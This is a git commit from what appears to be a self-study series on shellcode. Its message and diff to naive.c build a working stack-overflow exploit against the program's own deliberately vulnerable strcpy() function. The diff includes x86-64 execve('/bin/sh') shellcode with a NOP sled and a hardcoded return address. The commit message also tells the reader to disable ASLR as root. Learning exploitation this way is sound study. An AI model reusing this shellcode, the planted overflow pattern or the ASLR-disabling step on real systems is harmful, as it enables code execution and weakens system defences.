245617a15d178f578b7908198490e11a8897d280
Ilan Smith <lunnys@gmail.com>
2015-12-30 17:20:51 +0200

    shellcode phase 6: pass shellcode to vulnerable func, exploit strcpy
    We can now finally exploit strcpy() to overrun the stack with shellcode
    that will spawn a shell.
    
    The general approach to doing this is as follows:
    1. Identify the address on the stack to which we will want execution
       to be transferred. We refer to this address henceforth as ADDRESS.
       This is normally the strcpy() destination address.
    2. Construct the shellcode with NOP padding at the beginning of the
       buffer and with ADDRESS at the end. Schematically, the shellcode
       buffer should look something like:
    
       "NOP NOP NOP NOP NOP NOP NOP NOP" \
       "NOP NOP NOP NOP ...            " \
       "              ...              " \
       "... NOP NOP"                     \
                                         \
                   "SHELLCODE.."         \
                                         \
                               "ADDRESS" \
       "ADDRESS ADDRESS ...            " \
       "           ...          ADDRESS"
    
    This allows some flexibility regarding the exact offset from the start
    of the shellcode buffer on stack to the precise location of the
    function's return address which needs to be overwritten.
    The series of NOPs at the beginning also allows the jump-to address to
    be more flexible, resulting in sequential NOP execution prior to
    reaching and executing the shellcode itself.
    
    While this is a plausible technique in the case of 32 bit architectures
    where the stack addresses do not contain \x00 bytes and are of the form:
    
        0xbffff26c
    
    on 64 bit architectures, the stack addresses are of the form:
    
        0x00007fffffffd4a0
    
    consisting of two \x00 which would be interpreted by strcpy() as
    a NULL terminator byte.
    Hence in our example, I've had to change the above scheme a little to:
    
       "NOP NOP NOP NOP NOP NOP NOP NOP" \
       "NOP NOP NOP NOP ...            " \
       "              ...              " \
       "... NOP NOP"                     \
                                         \
                   "SHELLCODE.."         \
                                         \
       "FFFFFFFFFFFFFF FFFFFFFFFFFFFFFF" \
       "FFFFFFFFFFFFFF      0000ADDRESS"
    
    From here on, we require disabling of Linux ASLR (address space
    layout randomization) in order to get consistent addressing of the
    shellcode buffer (which needs to be hardcoded into the shellcode).
    
    To disable ASLR, issue (as root):
    
        echo 0 > /proc/sys/kernel/randomize_va_space
    
    Note, the assembly version will necessarily cause a segmentation
    fault due to attempting the write a terminating NULL at the end of
    "/bin/sh". The .text section doesn't have write attributes.

--- naive.c
+++ naive.c
@@ -1,11 +1,99 @@
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
 #undef ASSEMBLY
+
+#if !defined(ASSEMBLY)
+#define RANDOMIZE_VA_SPACE "/proc/sys/kernel/randomize_va_space"
+
+static char my_execve[] =
+	"\x90\x90\x90\x90\x90\x90\x90\x90"      /* nop, nop, nop, ...        */
+	"\x90\x90\x90\x90\x90\x90\x90\x90"
+	"\x90\x90\x90\x90\x90\x90\x90\x90"
+	"\x90\x90\x90\x90\x90\x90\x90\x90"
+	"\x90\x90\x90\x90\x90\x90\x90\x90"
+	"\x90\x90\x90\x90\x90\x90\x90\x90"
+	"\x90\x90\x90\x90\x90\x90\x90\x90"
+	"\x90\x90\x90\x90\x90\x90\x90\x90"
+	"\x90\x90\x90\x90\x90\x90\x90\x90"
+	"\x90\x90\x90\x90\x90\x90\x90\x90"
+	"\x90\x90\x90\x90\x90\x90\x90\x90"
+	"\x90\x90\x90\x90\x90\x90\x90\x90"
+	"\x90\x90\x90\x90\x90\x90\x90\x90"
+	"\x90\x90\x90\x90\x90\x90\x90\x90"
+	"\x90\x90\x90\x90\x90\x90\x90\x90"
+	"\x90\x90\x90\x90\x90\x90\x90\x90"
+	"\x90\x90\x90\x90\x90"
+	"\x48\x8d\x05\x3c\x11\x11\x11"          /* lea 0x1111113c(%rip),%rax */
+	"\x48\x2d\x11\x11\x11\x11"              /* sub    $0x11111111,%rax   */
+	"\xff\xe0"                              /* jmpq   *%rax              */
+	"\x48\x31\xc0"                          /* xor    %rax,%rax          */
+	"\x48\x89\x44\x24\x08"                  /* mov    %rax,0x8(%rsp)     */
+	"\x48\x8b\x3c\x24"                      /* mov    (%rsp),%rdi        */
+	"\x88\x47\x07"                          /* mov    %al,0x7(%rdi)      */
+	"\x48\x89\xe6"                          /* mov    %rsp,%rsi          */
+	"\x48\x8b\x54\x24\x08"                  /* mov    0x8(%rsp),%rdx     */
+	"\xb8\x4c\x11\x11\x11"                  /* mov    $0x1111114c,%eax   */
+	"\x2d\x11\x11\x11\x11"                  /* sub    $0x11111111,%eax   */
+	"\x0f\x05"                              /* syscall                   */
+	"\x48\x8d\x05\xd6\xff\xff\xff"          /* lea    -0x2a(%rip),%rax   */
+	"\xff\xd0"                              /* callq  *%rax              */
+	"\x2f\x62\x69\x6e\x2f\x73\x68"          /* .string \"/bin/sh\"       */
+	"\xff"
+	"\xff\xff\xff\xff\xff\xff\xff\xff"      /* padding...                */
+	"\xff\xff\xff\xff\xff\xff\xff\xff"
+	"\xff\xff\xff\xff\xff\xff\xff\xff"
+	"\xff\xff\xff\xff\xff\xff\xff\xff"
+	"\xff\xff\xff\xff\xff\xff\xff\xff"
+	"\xff\xff\xff\xff\xff\xff\xff\xff"
+	"\xff\xff\xff\xff\xff\xff\xff\xff"
+	"\xff\xff\xff\xff\xff\xff\xff\xff"
+	"\xf0\xd3\xff\xff\xff\x7f\x00\x00"      /* (unsigned long)dst + 16*8 */
+	;
+
+static void assert_no_aslr(void)
+{
+	FILE *fd;
+	int err = 0;
+	char randomize_va_space;
+
+	fd = fopen(RANDOMIZE_VA_SPACE, "r");
+	if (!fd) {
+		printf("could not open " RANDOMIZE_VA_SPACE "\n");
+		exit(1);
+	}
+
+	if (fread(&randomize_va_space, sizeof(char), 1, fd) != 1) {
+		printf("could not read " RANDOMIZE_VA_SPACE  "\n");
+		err = 1;
+	}
+
+	fclose(fd);
+
+	if (randomize_va_space != '0') {
+		if (!err) {
+			printf(RANDOMIZE_VA_SPACE ": %c\n issue (as root):\n\n"
+				"    echo 0 > " RANDOMIZE_VA_SPACE "\n\n",
+				randomize_va_space);
+		}
+		exit(1);
+	}
+}
+
+static void vulnerable_func(char *src)
+{
+	char dst[256];
+
+	strcpy(dst, src);
+	printf("Got: %s\n", dst);
+}
+#endif
 
 int main(int argc, char **argv)
 {
-	int ret = 0;
-
 #if defined(ASSEMBLY)
-	__asm__("lea 0x11111139(%rip),%rax");   /* load 'call' block address */
+	__asm__("lea 0x1111113c(%rip),%rax");   /* load 'call' block address */
 	__asm__("sub $0x11111111,%rax");        /* to $rax. Note: $rip is
 	                                           that of the next op       */
 	__asm__("jmp *%rax");                   /* jmp to 'call' block       */
@@ -14,6 +102,8 @@ int main(int argc, char **argv)
 	                                           array with a NULL         */
 	__asm__("mov 0x0(%rsp),%rdi");          /* set string address as
 	                                           execve's 1st param        */
+	__asm__("mov %al,0x7(%rdi)");           /* replace 'X' with NULL
+	                                           terminator after /bin/sh  */
 	__asm__("mov %rsp,%rsi");               /* set argv array address as
 	                                           execve's 2nd param        */
 	__asm__("mov 0x8(%rsp),%rdx");          /* set the same NULL that
@@ -23,32 +113,16 @@ int main(int argc, char **argv)
 	__asm__("mov $0x1111114c,%eax");        /* set 0x1111114c - execve's */
 	__asm__("sub $0x11111111,%eax");        /* system call id in $eax    */
 	__asm__("syscall");                     /* execute the system call   */
-	__asm__("lea -0x27(%rip),%rax");        /* prepare to call back to
+	__asm__("lea -0x2a(%rip),%rax");        /* prepare to call back to
 	                                           after the jmp instruction */
 	__asm__("callq *%rax");                 /* call back to after the
 	                                           jmp instruction           */
 	__asm__(".string \"/bin/sh\"");         /* execution string for
 	                                           execve                    */
 #else
-	char my_execve[] =
-		"\x48\x8d\x05\x39\x11\x11\x11"  /* lea 0x11111139(%rip),%rax */
-		"\x48\x2d\x11\x11\x11\x11"      /* sub    $0x11111111,%rax   */
-		"\xff\xe0"                      /* jmpq   *%rax              */
-		"\x48\x31\xc0"                  /* xor    %rax,%rax          */
-		"\x48\x89\x44\x24\x08"          /* mov    %rax,0x8(%rsp)     */
-		"\x48\x8b\x3c\x24"              /* mov    (%rsp),%rdi        */
-		"\x48\x89\xe6"                  /* mov    %rsp,%rsi          */
-		"\x48\x8b\x54\x24\x08"          /* mov    0x8(%rsp),%rdx     */
-		"\xb8\x4c\x11\x11\x11"          /* mov    $0x1111114c,%eax   */
-		"\x2d\x11\x11\x11\x11"          /* sub    $0x11111111,%eax   */
-		"\x0f\x05"                      /* syscall                   */
-		"\x48\x8d\x05\xd9\xff\xff\xff"  /* lea    -0x27(%rip),%rax   */
-		"\xff\xd0"                      /* callq  *%rax              */
-		"\x2f\x62\x69\x6e\x2f\x73\x68"  /* .string \"/bin/sh\"       */
-		"\x00"
-		;
-	*(((unsigned long*)(&ret + 1)) + 1) = (unsigned long)my_execve;
+	assert_no_aslr();
+	vulnerable_func(my_execve);
 #endif
-	return ret;
+	return 0;
 }
 
